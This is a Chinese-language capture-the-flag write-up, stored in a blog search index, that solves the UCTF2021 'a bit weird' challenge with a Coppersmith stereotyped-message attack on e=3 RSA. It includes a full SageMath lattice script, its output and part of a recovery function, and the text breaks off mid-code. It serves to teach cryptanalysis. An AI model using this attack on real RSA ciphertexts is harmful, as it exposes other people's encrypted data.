<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【Crypto-CTF】Crpyto-RSA stereotyped message atack-(UCTF2021-a bit weird)</title>
      <link href="2021/03/17/Crypto-03-RSA%20Stereotyped%20message%20attack-(UCTF2021-a%20bit%20weird)/"/>
      <url>2021/03/17/Crypto-03-RSA%20Stereotyped%20message%20attack-(UCTF2021-a%20bit%20weird)/</url>
      
        <content type="html"><![CDATA[<p>前段时间做UCTF2021的Crypto题时，遇到的一道RSA stereotyped message攻击的题，主要涉及的知识有RSA 、Coppersmith、<code>与 and</code>和<code>或 or</code>的理解、移位操作。</p><a id="more"></a><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>要传递的message格式：</p><p><code>hello ,my name is xxx</code></p><p>在使用RSA对这个message加密，我们知道密文ciphertext和公钥（N,e=3），如何求原始的message</p><h2 id="攻击阐述"><a href="#攻击阐述" class="headerlink" title="攻击阐述"></a>攻击阐述</h2><p>我们用<code>b&#39;\x00&#39;</code>替换消息中的<code>x</code>，这样就有了$(m+x)^e$ mod n=c</p><blockquote><ul><li>m 是用<code>b&#39;\x00&#39;</code>替换后的消息</li><li>x是<code>xxx</code>我们要发现的</li><li>(e,n)是公钥，c是密文</li></ul></blockquote><p>问题变为如何找到$x$</p><p>Coppersmith解决了这个问题，更多可参考：<a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">Comppersmith</a></p><h3 id="攻击成功条件"><a href="#攻击成功条件" class="headerlink" title="攻击成功条件"></a>攻击成功条件</h3><ul><li>e=3</li><li>$x&lt;N^{\frac{1}{e}}$</li></ul><h2 id="UCTF2021-a-bit-weird"><a href="#UCTF2021-a-bit-weird" class="headerlink" title="UCTF2021-a bit weird"></a>UCTF2021-a bit weird</h2><p>I found this weird RSA looking thing somewhere. Can you break it for me? I managed to find x for you, but I don’t know how to solve it without d…</p><p><a href="msg.txt">msg.txt</a></p><p><a href="main.py">main.py</a></p><h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><ul><li>题目给出的挑战</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#main.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">length = <span class="number">2048</span></span><br><span class="line">p, q = number.getPrime(length//<span class="number">2</span>), number.getPrime(length//<span class="number">2</span>)</span><br><span class="line">N = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">m = number.bytes_to_long(flag)</span><br><span class="line">x = number.bytes_to_long(os.urandom(length//<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">c = pow(m|x, e, N)</span><br><span class="line">print(<span class="string">'N ='</span>, N);</span><br><span class="line">print(<span class="string">'e ='</span>, e);</span><br><span class="line">print(<span class="string">'c ='</span>, c);</span><br><span class="line">print(<span class="string">'m&amp;x ='</span>, m&amp;x);</span><br></pre></td></tr></table></figure><p>依据msg.txt，知道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">13876129555781460073002089038351520612247655754841714940325194761154811715694900213267064079029042442997358889794972854389557630367771777876508793474170741947269348292776484727853353467216624504502363412563718921205109890927597601496686803975210884730367005708579251258930365320553408690272909557812147058458101934416094961654819292033675534518433169541534918719715858981571188058387655828559632455020249603990658414972550914448303438265789951615868454921813881331283621117678174520240951067354671343645161030847894042795249824975975123293970250188757622530156083354425897120362794296499989540418235408089516991225649</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">6581985633799906892057438125576915919729685289065773835188688336898671475090397283236146369846971577536055404744552000913009436345090659234890289251210725630126240983696894267667325908895755610921151796076651419491871249815427670907081328324660532079703528042745484899868019846050803531065674821086527587813490634542863407667629281865859168224431930971680966013847327545587494254199639534463557869211251870726331441006052480498353072578366929904335644501242811360758566122007864009155945266316460389696089058959764212987491632905588143831831973272715981653196928234595155023233235134284082645872266135170511490429493</span></span><br><span class="line"><span class="comment"># m&amp;x</span></span><br><span class="line">m_x = <span class="number">947571396785487533546146461810836349016633316292485079213681708490477178328756478620234135446017364353903883460574081324427546739724</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">15581107453382746363421172426030468550126181195076252322042322859748260918197659408344673747013982937921433767135271108413165955808652424700637809308565928462367274272294975755415573706749109706624868830430686443947948537923430882747239965780990192617072654390726447304728671150888061906213977961981340995242772304458476566590730032592047868074968609272272687908019911741096824092090512588043445300077973100189180460193467125092550001098696240395535375456357081981657552860000358049631730893603020057137233513015505547751597823505590900290756694837641762534009330797696018713622218806608741753325137365900124739257740</span></span><br></pre></td></tr></table></figure><p>我们知道<code>m&amp;x，x</code>但并恢复不了<code>m</code>,看来我们必须解密c才能得到$m | x$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#简单统计一下，m&amp;x和x的位数</span></span><br><span class="line">len(bin(m_x)[<span class="number">2</span>:]),len(bin(x)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x比m多的位数</span></span><br><span class="line"><span class="number">2048</span><span class="number">-440</span></span><br></pre></td></tr></table></figure><p>由此，可得知以下关于<code>m|x</code></p><ul><li>由<code>m&amp;x</code>和<code>x</code>知<code>m</code>为440位，x为2048位</li><li>也就意味着<code>m|x</code>的高1608位对应x的高位</li></ul><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>故有以下已知信息：</p><ul><li>a =m | x( 取低440位）</li><li>b =x(取x高1680位，低440位赋值为0)</li><li>则 m | x==b+a，有$c==(b+a)^e mod N$</li></ul><p>这可以归为RSA中stereotyped messages类型攻击，我们能使用Coppersmith恢复<code>a</code></p><h4 id="了解RSA-stereotyped-messages"><a href="#了解RSA-stereotyped-messages" class="headerlink" title="了解RSA-stereotyped messages"></a>了解RSA-stereotyped messages</h4><ul><li><p>使用场景：知道消息的部分关键位数，使用该方法可以找到消息的其他位</p></li><li><p>RSA的一个模型：$m^e=c (mod N)$，这个模型可以解决$c=(m+x)^e$，你知道明文的部分m，但是不知道x</p><blockquote><p>如果寻找的是消息的$N^{1/e}$，并且是个较小的根，应该可以较快找到</p></blockquote></li><li><p>多项式为$f(x)=(m+x)^e-c$ 想发现模N的一个根。</p></li><li><p>代码实现：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dd = f.degree()</span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">epsilon = beta / <span class="number">7</span></span><br><span class="line">mm = ceil(beta**<span class="number">2</span> / (dd * epsilon))</span><br><span class="line">tt = floor(dd * mm * ((<span class="number">1</span>/beta) - <span class="number">1</span>))</span><br><span class="line">XX = ceil(N**((beta**<span class="number">2</span>/dd) - epsilon))</span><br><span class="line">roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)</span><br></pre></td></tr></table></figure><p>您可以使用这些值，直到它找到根。默认值应该是一个很好的开始。如果你想调整:</p><ul><li>beta：在这种情况下总是1</li><li>XX是根节点的上界。未知数越大，XX也就越大。而且它越大……花的时间越多</li></ul><h4 id="sage脚本获取x-coppersmith-sage"><a href="#sage脚本获取x-coppersmith-sage" class="headerlink" title="sage脚本获取x(coppersmith.sage)"></a>sage脚本获取x(coppersmith.sage)</h4><p>获取x的低440位的sage脚本，可在线运行sage脚本<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Coppersmith implementation </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        print(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coppersmith_howgrave_univariate</span><span class="params">(pol, modulus, beta, mm, tt, XX)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Coppersmith revisited by Howgrave-Graham</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * b|modulus, b &gt;= modulus^beta , 0 &lt; beta &lt;= 1</span></span><br><span class="line"><span class="string">    * |x| &lt; XX</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    dd = pol.degree()</span><br><span class="line">    nn = dd * mm + tt</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># checks</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"beta should belongs in (0, 1]"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pol.is_monic():</span><br><span class="line">        <span class="keyword">raise</span> ArithmeticError(<span class="string">"Polynomial must be monic."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># calculate bounds and display them</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    * we want to find g(x) such that ||g(xX)|| &lt;= b^m / sqrt(n)</span></span><br><span class="line"><span class="string">    * we know LLL will give us a short vector v such that:</span></span><br><span class="line"><span class="string">    ||v|| &lt;= 2^((n - 1)/4) * det(L)^(1/n)</span></span><br><span class="line"><span class="string">    * we will use that vector as a coefficient vector for our g(x)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    * so we want to satisfy:</span></span><br><span class="line"><span class="string">    2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    so we can obtain ||v|| &lt; N^(beta*m) / sqrt(n) &lt;= b^m / sqrt(n)</span></span><br><span class="line"><span class="string">    (it's important to use N because we might not know b)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="comment"># t optimized?</span></span><br><span class="line">        print(<span class="string">"\n# Optimized t?\n"</span>)</span><br><span class="line">        print(<span class="string">"we want X^(n-1) &lt; N^(beta*m) so that each vector is helpful"</span>)</span><br><span class="line">        cond1 = RR(XX^(nn<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"* X^(n-1) = "</span>, cond1)</span><br><span class="line">        cond2 = pow(modulus, beta*mm)</span><br><span class="line">        print(<span class="string">"* N^(beta*m) = "</span>, cond2)</span><br><span class="line">        print(<span class="string">"* X^(n-1) &lt; N^(beta*m) \n-&gt; GOOD"</span> <span class="keyword">if</span> cond1 &lt; cond2 <span class="keyword">else</span> <span class="string">"* X^(n-1) &gt;= N^(beta*m) \n-&gt; NOT GOOD"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># bound for X</span></span><br><span class="line">        print(<span class="string">"\n# X bound respected?\n"</span>)</span><br><span class="line">        print(<span class="string">"we want X &lt;= N^(((2*beta*m)/(n-1)) - ((delta*m*(m+1))/(n*(n-1)))) / 2 = M"</span>)</span><br><span class="line">        print(<span class="string">"* X ="</span>, XX)</span><br><span class="line">        cond2 = RR(modulus^(((<span class="number">2</span>*beta*mm)/(nn<span class="number">-1</span>)) - ((dd*mm*(mm+<span class="number">1</span>))/(nn*(nn<span class="number">-1</span>)))) / <span class="number">2</span>)</span><br><span class="line">        print(<span class="string">"* M ="</span>, cond2)</span><br><span class="line">        print(<span class="string">"* X &lt;= M \n-&gt; GOOD"</span> <span class="keyword">if</span> XX &lt;= cond2 <span class="keyword">else</span> <span class="string">"* X &gt; M \n-&gt; NOT GOOD"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># solution possible?</span></span><br><span class="line">        print(<span class="string">"\n# Solutions possible?\n"</span>)</span><br><span class="line">        detL = RR(modulus^(dd * mm * (mm + <span class="number">1</span>) / <span class="number">2</span>) * XX^(nn * (nn - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">"we can find a solution if 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)"</span>)</span><br><span class="line">        cond1 = RR(<span class="number">2</span>^((nn - <span class="number">1</span>)/<span class="number">4</span>) * detL^(<span class="number">1</span>/nn))</span><br><span class="line">        print(<span class="string">"* 2^((n - 1)/4) * det(L)^(1/n) = "</span>, cond1)</span><br><span class="line">        cond2 = RR(modulus^(beta*mm) / sqrt(nn))</span><br><span class="line">        print(<span class="string">"* N^(beta*m) / sqrt(n) = "</span>, cond2)</span><br><span class="line">        print(<span class="string">"* 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n) \n-&gt; SOLUTION WILL BE FOUND"</span> <span class="keyword">if</span> cond1 &lt; cond2 <span class="keyword">else</span> <span class="string">"* 2^((n - 1)/4) * det(L)^(1/n) &gt;= N^(beta*m) / sqroot(n) \n-&gt; NO SOLUTIONS MIGHT BE FOUND (but we never know)"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># warning about X</span></span><br><span class="line">        print(<span class="string">"\n# Note that no solutions will be found _for sure_ if you don't respect:\n* |root| &lt; X \n* b &gt;= modulus^beta\n"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Coppersmith revisited algo for univariate</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># change ring of pol and x</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute polynomials</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(dd):</span><br><span class="line">            gg.append((x * XX)**jj * modulus**(mm - ii) * polZ(x * XX)**ii)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(tt):</span><br><span class="line">        gg.append((x * XX)**ii * polZ(x * XX)**mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii+<span class="number">1</span>):</span><br><span class="line">            BB[ii, jj] = gg[ii][jj]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display basis matrix</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform shortest vector in polynomial    </span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        new_pol += x**ii * BB[<span class="number">0</span>, ii] / XX**ii</span><br><span class="line"></span><br><span class="line">    <span class="comment"># factor polynomial</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line">    print(<span class="string">"potential roots:"</span>, potential_roots)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test roots</span></span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> potential_roots:</span><br><span class="line">        <span class="keyword">if</span> root[<span class="number">0</span>].is_integer():</span><br><span class="line">            result = polZ(ZZ(root[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">if</span> gcd(modulus, result) &gt;= modulus^beta:</span><br><span class="line">                roots.append(ZZ(root[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"><span class="comment"># Public key</span></span><br><span class="line">N = <span class="number">13876129555781460073002089038351520612247655754841714940325194761154811715694900213267064079029042442997358889794972854389557630367771777876508793474170741947269348292776484727853353467216624504502363412563718921205109890927597601496686803975210884730367005708579251258930365320553408690272909557812147058458101934416094961654819292033675534518433169541534918719715858981571188058387655828559632455020249603990658414972550914448303438265789951615868454921813881331283621117678174520240951067354671343645161030847894042795249824975975123293970250188757622530156083354425897120362794296499989540418235408089516991225649</span></span><br><span class="line">length_N = <span class="number">2048</span></span><br><span class="line">ZmodN = Zmod(N);</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obscuring term (was called `x` previously)</span></span><br><span class="line">obs = <span class="number">15581107453382746363421172426030468550126181195076252322042322859748260918197659408344673747013982937921433767135271108413165955808652424700637809308565928462367274272294975755415573706749109706624868830430686443947948537923430882747239965780990192617072654390726447304728671150888061906213977961981340995242772304458476566590730032592047868074968609272272687908019911741096824092090512588043445300077973100189180460193467125092550001098696240395535375456357081981657552860000358049631730893603020057137233513015505547751597823505590900290756694837641762534009330797696018713622218806608741753325137365900124739257740</span></span><br><span class="line">length_obs = <span class="number">440</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ciphertext</span></span><br><span class="line">C = <span class="number">6581985633799906892057438125576915919729685289065773835188688336898671475090397283236146369846971577536055404744552000913009436345090659234890289251210725630126240983696894267667325908895755610921151796076651419491871249815427670907081328324660532079703528042745484899868019846050803531065674821086527587813490634542863407667629281865859168224431930971680966013847327545587494254199639534463557869211251870726331441006052480498353072578366929904335644501242811360758566122007864009155945266316460389696089058959764212987491632905588143831831973272715981653196928234595155023233235134284082645872266135170511490429493</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obsuring term with lower 440 bits zero'd (was called 'b' previously)</span></span><br><span class="line"></span><br><span class="line">obs_clean = (obs &gt;&gt; length_obs) &lt;&lt; length_obs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Problem to equation.</span></span><br><span class="line"><span class="comment"># The `x` here was called `a` previously, which we are now solving for.</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">pol = (obs_clean + x)^e - C</span><br><span class="line"></span><br><span class="line">dd = pol.degree()</span><br><span class="line">beta = <span class="number">1</span>                                <span class="comment"># b = N</span></span><br><span class="line">epsilon = beta / <span class="number">7</span>                      <span class="comment"># &lt;= beta / 7</span></span><br><span class="line">mm = ceil(beta**<span class="number">2</span> / (dd * epsilon))     <span class="comment"># optimized value</span></span><br><span class="line">tt = floor(dd * mm * ((<span class="number">1</span>/beta) - <span class="number">1</span>))    <span class="comment"># optimized value</span></span><br><span class="line">XX = ceil(N**((beta**<span class="number">2</span>/dd) - epsilon))  <span class="comment"># optimized value</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Coppersmith</span></span><br><span class="line">roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"Solutions"</span>)</span><br><span class="line">print(<span class="string">"We found:"</span>, str(roots))</span><br></pre></td></tr></table></figure><p>sage脚本运行结果：</p><pre><code># Optimized t?we want X^(n-1) &lt; N^(beta*m) so that each vector is helpful* X^(n-1) =  7.64639144486953e938* N^(beta*m) =  2671806721397343609369125721689846363846823887595317169259208269410807613515138193272735950395342600354585884618596837138454312445763723886601166952043062748009505139217794681937611360645445444140769994643446818754534866298130651329433014724715889837444867182984191620190905818803588933562722223328979700923934070485221893022649172511067198019458620445165662776678908770872500383557396520873649954695933963393304148547194098533517769688355801169062583949901346704912994207653877424119826970416572728246446525108981742453007188018279798743202379750534406784078069421672055702384012232185139872186089443647992149818358893834997950425662042050549158210414590239894415499371752895019920281114015215479652534190130397775610338712743962931327219145055957487978233015931879293485628652795746982880303598514651118264609343317354096189644231871614967872526120966984276731281546669197245726209804436508113354381914315232435894150854988195962920941429615473853382836785869279384612192426076678623082066854288934520774307146911493350318344271370346300740624871491708331236066262479670355346647414096649266862487754904950869424292066310431256633985253697575515680033391453124985988988670191902111914051233299493877035782843638962398086115700226338455677786300225885984533601124871244669214214105103887099092767042659106858007541232363169127153863660502490389037875332835859504268824420222360070871822883878805542227544448876610761790896706106782074035914998714448926799887557941643969590869586865208655191892111098282289241597413702345534627562696456765064323919706870792491286590311106687866963980133668858578681546024445557042142046310271577884977392878357234252136015344414426228232128893808200127782962118800708442012306882529157602730015548081294901794784475069861171020927127171831672885720955503939986515276832850113174993877171846111637519924505032034449* X^(n-1) &lt; N^(beta*m) -&gt; GOOD# X bound respected?we want X &lt;= N^(((2*beta*m)/(n-1)) - ((delta*m*(m+1))/(n*(n-1)))) / 2 = M* X = 2293147898964117288808008000805061598361990209625542167130389100774470198047923394475218668318195962237962277248056358* M = 5.42671596118645e153* X &lt;= M -&gt; GOOD# Solutions possible?we can find a solution if 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)* 2^((n - 1)/4) * det(L)^(1/n) =  2.12973195403260e1702* N^(beta*m) / sqrt(n) =  8.90602240465781e1847* 2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n) -&gt; SOLUTION WILL BE FOUND# Note that no solutions will be found _for sure_ if you don&apos;t respect:* |root| &lt; X * b &gt;= modulus^beta00 X 0 0 0 0 0 0 0 0 ~01 0 X 0 0 0 0 0 0 0 ~02 0 0 X 0 0 0 0 0 0 ~03 X X X X 0 0 0 0 0 04 0 X X X X 0 0 0 0 05 0 0 X X X X 0 0 0 06 X X X X X X X 0 0 07 0 X X X X X X X 0 08 0 0 X X X X X X X potential roots: [(2722393138562666557007231734043804673010965247853655886232567981247025605356740318867235245940388712958024648376448739432029199788029, 1)]SolutionsWe found: [2722393138562666557007231734043804673010965247853655886232567981247025605356740318867235245940388712958024648376448739432029199788029]</code></pre><h4 id="恢复明文m"><a href="#恢复明文m" class="headerlink" title="恢复明文m"></a>恢复明文m</h4><ul><li>现在知道<code>m|x</code>的低440位，可恢复m</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span><span class="params">(x, m_and_x, m_or_x)</span>:</span></span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> m_and_x &gt; <span class="number">0</span>:</span><br><span class="line">        a = x &amp; <span class="number">1</span> <span class="comment">#取x的最低一位</span></span><br><span class="line">        b = m_and_x &amp; <span class="number">1</span></span><br><span class="line">        c = m_or_x &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">0</span>: <span class="comment"># 若a=0，0 and (0 或1)=0 故看 0 or c=c</span></span><br><span class="line">            <span class="keyword">assert</span> b == <span class="number">0</span></span><br><span class="line">            ans.append(str(c))</span><br><span class="line">        <span class="keyword">else</span>:     <span class="comment"># 若a=1,则 1 or (1 or 0)=1 ，故看1 and b=b</span></span><br><span class="line">            